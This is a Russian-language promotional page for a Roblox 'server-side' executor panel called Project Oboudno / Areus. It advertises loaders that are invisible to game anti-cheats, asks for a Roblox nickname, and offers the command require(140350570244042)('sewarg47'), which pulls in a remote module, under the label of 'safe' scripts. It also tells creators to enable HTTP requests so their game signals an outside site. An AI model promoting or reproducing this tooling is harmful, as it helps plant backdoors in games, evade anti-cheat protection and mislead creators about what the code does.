Информация о системе

Project Oboudno (Powered by Areus) — это передовое решение для безопасного контроля серверов в экосистеме Roblox беты.

Почему 1N Server-Side лидирует среди остальных панелей:

  • Полная невидимость лоадеров для стандартных игровых античитов.
  • Мгновенное логирование выполнения скриптов через защищенные базы данных.
  • Встроенные водяные знаки Areus для подтверждения прав администратора.
  • Умные подсказки для создателей прямо внутри игровых сессий.

Версия ядра: 1N_Areus_Beta_2026

Авторизация Создателя Areus

Впишите ваш никнейм в Roblox для привязки к бета-системе логов.

Веб-Executor логов

Разрешен запуск только безопасного fly и твоего скрипта require(140350570244042).

Разрешенные скрипты беты

В нашей безопасной бете открыт доступ только для двух следующих команд:

1. Безопасный полет: fly
2. Скрипт: require(140350570244042)("sewarg47")

Чтобы плейс отправлял сигналы на ваш сайт, зайдите в настройки игры в Roblox Studio -> Game Settings -> Security и обязательно включите пункт Allow HTTP Requests (Включить ХТТП)!
